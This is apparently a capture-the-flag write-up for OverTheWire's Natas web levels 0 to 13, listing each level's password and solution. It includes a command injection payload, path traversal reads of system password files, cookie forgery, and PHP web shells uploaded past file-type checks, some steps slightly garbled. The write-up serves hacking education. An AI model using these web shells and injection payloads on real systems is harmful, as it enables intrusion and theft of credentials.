# Natas--Over-the-wire-writeups

# level-0

link:  http://natas0.natas.labs.overthewire.org<br />
given user: natas0<br />
pass: natas0<br />

When we login with the above credentials, We can see a msg: `You can find the password for the next level on this page.`<br />
When we view the page source, we can find the password to next level.<br />
`-The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto`<br />

# Level 0 -> level 1

link:http://natas1.natas.labs.overthewire.org <br />
Given user: natas1 <br />
pass:gtVrDuiDfck831PqWsLEZy5gyDz1clto<br />

When we login with the above credentials, we can see the message `You can find the password for the next level on this page, but rightclicking has been blocked!`.<br />
So, we will press `ctrl+u` to view the page source. There we get the password for the next level.<br />
`The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi`<br />

# Level 1 -> Level 2

link:http://natas2.natas.labs.overthewire.org<br />
given user : natas2<br />
pass: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi<br />

When we login witht the above credentials, we can see the message, `there is nothing on this page.`<br />
When we view the page source we can see a file `/files/pixels.png`.<br />
When we go to the files directory, `/files/` we can see a file named `users.txt`. In that file we can see the password of the next level.<br />
`password: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14`<br />

# Level 2 -> Level 3

link: http://natas3.natas.labs.overthewire.org<br />
given user: natas3<br />
password: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14<br />

When we login with the credentials, we can see the message `there is nothing on this page`.<br />
When we the page source we can see a hint `No more information leaks!! Not even Google will find it this time...`<br />
From this we can understand that `robots.txt` can be used. In robots.txt we can find a disallow directory  `/s3cr3t/`.<br />
We we visit `http://natas3.natas.labs.overthewire.org/s3cr3t/`, we can see a file named `users.txt` in that directory.<br />
Opening `users.txt` gives us the password.<br />
`password: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`<br />

# Level 3->level 4

link:http://natas4.natas.labs.overthewire.org/<br />
user: natas4<br />
pass: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ<br />

When we login with the credentials, we get a message `Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/index.php" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"`.<br />
When we open the link in burp, change the `Referer: http://natas5.natas.labs.overthewire.org/`. And the Forward this modified request.<br />
Then we can find the message: `Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`<br />
`password: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`<br />


# Level 4-> Level 5

link:http://natas5.natas.labs.overthewire.org/<br />
user: natas5<br />
password:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq<br />

When we login with the above credentials, we get this message `Access disallowed. You are not logged in`<br />
When we look into the cookies in the page, we can see a cookie named `loggedin` and its `value=0`. Lets try changing the `value=1` in cookie editor and refresh the page.<br />
There we get this message : `Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`<br />
So, `password: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`<br />


# Level 5-> Level 6:

Link:http://natas6.natas.labs.overthewire.org/
user: natas6
pass: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

When we login with these credentials, we can see a form to submit some secret code.
When we view the source page, we can see the following php code.
```
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```
When we visit `http://natas6.natas.labs.overthewire.org/includes/secret.inc`, we get the following secret code
`secret:FOEIUWGHFEEUHOFUOIU`
When we submit the secret code, we get the message `Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`
`password: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`


# Level 6-> level 7:

link: http://natas7.natas.labs.overthewire.org<br />
user: natas7<br />
passw:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9<br />
When we log in with above credentials, we can see a page with `home` and `about` section. While viewing the page source, we can see a hint<br />
`hint: password for webuser natas8 is in /etc/natas_webpass/natas8`<br />
So, we click on `home`, we get the url as `http://natas7.natas.labs.overthewire.org/index.php?page=home`<br />
So, changing the url to `http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8` will give the password<br />
`password: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`<br />

# Level 7 -> Level 8:

link: http://natas8.natas.labs.overthewire.org
user: natas8
pass:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

When we login with the above credentials, we can see a form to submit a secret code. Viewing the source code gives the following php code.
```
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```
In the above php code, 3 functions are being used. `Bin2hex, strrev and base64_encoding.`
So, to find the secret code, we have to do these functions, in the reverse way, i.e `hex2bin, strrev, base64_decoding`
So in terminal,
```
php -r 'echo strrev(hex2bin("3d3d516343746d4d6d6c315669563362"));' | base64 -d

Output - oubWYf2kBq
```
So, Secret code=oubWYf2kBq
Submitting the secret code will give the password for next level.
`pass: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`

# Level 8 -> level 9:

link:http://natas9.natas.labs.overthewire.org/
user: natas9
pass:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

 When we login with the above credentials, we get a page to submit something. `Find words containing: ______`
 When we view the page source code, we get the following php code.
 ```
 <?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```
+ Here passthru() is used to execute external program(here grep command)
+ grep command filters the content of a file which makes our search easy.The 'grep -i' command filters output in a case-insensitive way.
+ Syntax of grep:  grep -i  'search word' 'filename'  
            here:  grep -i $key dictionary.txt
+ So, we need to find the password for level 10, it is stored in /etc/natas_webpass/natas10
+ So, in the textbox we execute the following command,
    `; cat /etc/natas_webpass/natas10`
+ We use (;) semi colon to execute multiple commands in a single line, So after submitting the above command, we get the password of level 10
+ `password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`

## Reference:
+ Passthru(): https://www.php.net/manual/en/function.passthru.php
+ grep command: https://www.javatpoint.com/linux-grep
+ chaining commands in linux: https://www.geeksforgeeks.org/chaining-commands-in-linux/


# Level 9-> level 10

user: natas10
password:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
link:  http://natas10.natas.labs.overthewire.org

While login with the above user and pass, we can see a textbox like last time, to enter `words containing:____`. Also written that `For security reasons, we now filter on certain characters`
Checking the source code, we can see the following php code:
```
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```
+ Given that `/[;|&]/` these characters cannot be present in the text we input.
+ So, we input the following payload:
  `. etc/webpass_natas/natas11` and we get the password for next level
 + `password: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK `
 
 ## Reference
+ preg_match(): https://www.php.net/manual/en/function.preg-match.php

# Level 10-> level 11

user: natas11
pass: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
link:http://natas11.natas.labs.overthewire.org

When we login, it is written that `Cookies are protected with XOR encryption`. When we view the source code, we can see the following php code:
```
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);

?>
```
+ All we want to do is to make `show password` = true, and we get the password
```
<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}

?>
```
+ When we checked for the cookies, we saw cookie named data with the value :ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D
+ Now we need to url decode this value and we get it as: ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=
+ Now we need to json_encode the following array,
  `array( "showpassword"=>"yes", "bgcolor"=>"#ffffff")`
  For that we run the following php command,
  ```
  <?php
	echo json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"));
  ?>
  ```
  It gives `{"showpassword":"no","bgcolor":"#ffffff"}`
 + Next we do the xor encryption, using `{"showpassword":"no","bgcolor":"#ffffff"}` as the key.
 + So, we get `qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq`. ( the key is smaller than the plaintext it is repeated, so from that we can infer that the key is `qw8J`.
 + Now we json_encode `array( "showpassword"=>"yes", "bgcolor"=>"#ffffff")` and we get `{"showpassword":"yes","bgcolor":"#ffffff"}`
 + We xor encrypt the above obtained json encode with the key `qw8J` and then base64_encode it to get the following value
   `ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK`
 + Then we change the above obtained value in the cookie and get the password
   `The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3`
   
   
   
 ## Level 11 -> level 12
 
 user: natas12
 pass: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
 link:http://natas12.natas.labs.overthewire.org/
 
 When we login with the above credentials, we get a page to upload file. (Choose a JPEG to upload (max 1KB):)
 When we viewed the source code, we got the following php code
 ```
 <? 

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<? } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```
Functions used in the code:
+ pathinfo()-    The pathinfo() function returns information about a file path.
https://www.w3schools.com/php/func_filesystem_pathinfo.asp
+ move_uploaded_file- https://www.w3schools.com/php/func_filesystem_move_uploaded_file.asp
+ About hidden type in html:https://www.w3schools.com/tags/att_input_type_hidden.asp

So, as we can see the page only accepts `.jpg` files. So, to read the password of level 13 we will write a php code and should make it run in the page. To change the file type, modify the hidden input field for filename,so that it displays a php file extension instead of jpg.
For that we run the following code in the console,<br>
`$( 'input[name="filename"]').val("test.php")` and press enter<br>
Then in a file named `natas13.php` write the following code to access the password of level 13.<br>
```
<?php
$password = shell_exec("cat /etc/natas_webpass/natas13");
echo "<pre>$password</pre>"
?>
```
Here, shell_exec() is used to execute command via shell and return the complete output as a string.<br>
When we upload the file `natas13.php`, click on the link to your file so the webserver executes the script you wrote. Then we could find our password.<br>
`The password for natas13: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`
  
# Level 12->Level 13

user: natas13
password:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
Level 12 and 13 are kinda similar. The only difference is that the file checks for a image signature using the function `exif_imagetype()`.
Exif_imagetype():https://www.php.net/manual/en/function.exif-imagetype.php
The code looks like:
```
else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) 
{
        echo "File is not an image";
}
```
Reading through the source code, we can find that there is no check for the file extension. The code reads the first bytes of the image and checks its signature.
So, we should try to fake an image signature. As it not looking for file extensions, we can upload a .php file, like last level.  So to pass the exif_imagetype function check, our file must start with the magic number of a supported image format.
+ The magic number of jpg file is : FF D8 FF E0
+ So, I created a php file using the following python script:
```
>>> fh = open('shell.php','w')  
>>> fh.write('\xFF\xD8\xFF\xE0' + '<? passthru($_GET["cmd"]); ?>')  
>>> fh.close()  
```
+ The only code that will be executed will be that within the opening (<?) and closing (?>) PHP tags. We can start our file with anything we want.
+ Uploaded shell.php and checked the response in burp. So, once we upload the php file, we change the random-string-generated.php file to shell.php and send the request. When we do it a call is made to makeRandomPath() and it returns `\upload\random-string.php`. Now the user can go to the file and execute the following command in the url,
`URL [filename].php?cmd=cat /etc/natas_webpass/natas14`
And tus we obtain the password of next level.
pass: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

# Level 13 -> level 14:

user: natas14
pass: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1




    






